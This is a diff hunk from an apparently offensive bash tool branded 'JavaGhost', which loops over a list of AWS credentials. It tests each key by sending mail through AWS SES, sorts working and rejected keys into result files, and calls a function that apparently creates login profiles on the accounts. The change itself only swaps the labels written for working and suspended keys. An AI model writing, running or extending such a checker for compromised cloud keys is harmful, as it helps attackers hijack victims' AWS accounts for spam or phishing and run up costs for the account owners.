@@ -88,11 +88,11 @@ for aws_cred in $(cat $ask_lst); do
 			echo -e "${white}[ ${green}? ${white}] ${yellow}TRYING CHECK SEND TO ${blue}: ${green}${TO_MAIL}${white}"
 			check_send=$(aws ses send-email --from "${FROM_MAIL}" --destination "ToAddresses=$TO_MAIL" --message "Subject={Data=from JavaGhost,Charset=utf8},Body={Text={Data=JavaGhost - AWS SMTP TESTER BY : ./LazyBoy ,Charset=utf8}}" &> response_send.tmp ; cat response_send.tmp | grep -o "MessageRejected\|MessageId")
 			if [[ $check_send == "MessageRejected" ]]; then
-				Convert_to_SMTP WORK >> Results/SMTP_BAD.txt
+				Convert_to_SMTP SUSPEND >> Results/SMTP_BAD.txt
 				echo -e "${white}[ ${red}- ${white}] ${red}SENDING PAUSED${white}"
 				AWS_Create_Login_Profile
 			elif [[ $check_send == "MessageId" ]]; then
-				Convert_to_SMTP SUSPEND >> Results/SMTP_GOOD.txt
+				Convert_to_SMTP WORK >> Results/SMTP_GOOD.txt
 				echo -e "${white}[ ${green}+ ${white}] ${green}WORK FOR SEND${white}"
 				AWS_Create_Login_Profile
 			fi
